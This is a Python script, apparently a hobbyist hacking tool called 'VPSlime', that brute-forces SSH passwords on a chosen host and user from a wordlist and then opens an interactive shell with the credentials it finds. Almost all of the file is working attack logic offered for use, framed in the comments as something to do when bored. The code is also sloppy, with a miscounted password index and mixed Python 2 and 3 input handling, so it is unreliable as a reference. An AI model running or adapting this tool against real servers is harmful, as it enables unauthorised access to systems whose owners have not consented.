import os
import sys
import random
from pexpect import pxssh
from colored import fg
from termcolor import colored
from colors import *

'''
Hello!This is a tool I made to 
brutefoce into a VPS server with
the pxssh module from pexpect.
Use it Legally(stay legal), as this 
tool is meant to be something you
do when are bored.Edit it if you want,
but make sure you give me the credit.
Thx, and enjoy!
'''

def compileList(filename):
	file = open("%s" % (filename))
	for line in file:
		str(line)
		list.append(line)

def bruteForce(host, user):
	count = 0
	while True:
		s = pxssh.pxssh()
		try:
			for passwrd in list:
				s.login(host, user, passwrd)
				s.logout()
		except:
			count += 1
			continue
		print("\n")
		print("Login Successful!Password is %s" % (list[count]))
		break
		
def talking(host, user, passwrd):
	s = pxssh.pxssh()
	s.login(host, user, passwrd)
	s.interact()

list = []


try:

#Main Menu

	while True:

		os.system("clear")
		file = open("Banner/banner", "r")
		sys.stdout.write(BLUE)
		print(file.read())
		print("\n")
		print("%s [1] " % (fg("red")))+("%s Break In" % (fg("yellow")))
		print("%s [2] " % (fg("red")))+("%s Login" % (fg("yellow")))
		print("\n \n")
		menuChoice1 = input("%s <VPSlime>" % (fg("cyan")))
		
#Sub Menus

		if menuChoice1==1:
			while True:
				os.system("clear")
				file = open("Banner/breakin")
				sys.stdout.write(BLUE)
				print(file.read())
				print("\n")
				compileList(raw_input(colored("Filename: ", "white")))
				bruteForce(raw_input(colored("Host: ", "white")), raw_input(colored("Username: ", "white")))
				print(colored("00 for Main Menu, Enter for another, ^C for exit", "white"))
				print("\n")
				menu_choice = raw_input("%s <VPSlime>" % (fg("cyan")))
				if menu_choice==00:
					break
				
		elif menuChoice1==2:
			os.system("clear")
			while True:
				try:
					while True:
						talking(raw_input(colored("Host: ", "white")), raw_input(colored("Username: ", "white")), raw_input(colored("Password: ", "white")))
				except KeyboardInterrupt:
					break
		
		
except KeyboardInterrupt:
	print("\n")
	print("BYE, THX FOR USING THIS TOOL!")
